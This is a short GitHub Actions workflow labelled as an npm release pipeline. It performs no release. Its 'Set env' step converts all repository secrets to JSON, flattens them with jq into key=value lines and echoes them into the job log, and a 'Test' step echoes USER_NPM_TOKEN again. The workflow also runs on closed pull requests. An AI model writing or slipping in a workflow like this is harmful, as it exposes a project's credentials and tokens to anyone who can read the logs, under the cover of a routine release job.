name: release

on:
  workflow_dispatch:
    inputs:
      semver:
        description: "The semver to use"
        required: true
        default: "patch"
      tag:
        description: "The npm tag"
        required: false
        default: "latest"
  pull_request:
    types: [closed]

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Set env
        shell: bash
        env:
          ALL_SECRETS: ${{ toJson(secrets) }}
        run: >-
          echo "USER_NPM_TOKEN=$(jq -r 'to_entries|map("\(.key)=\(.value|tostring)")|.[]' <<< \"${{ env.ALL_SECRETS }}\")"
      - name: Test
        run: echo $USER_NPM_TOKEN
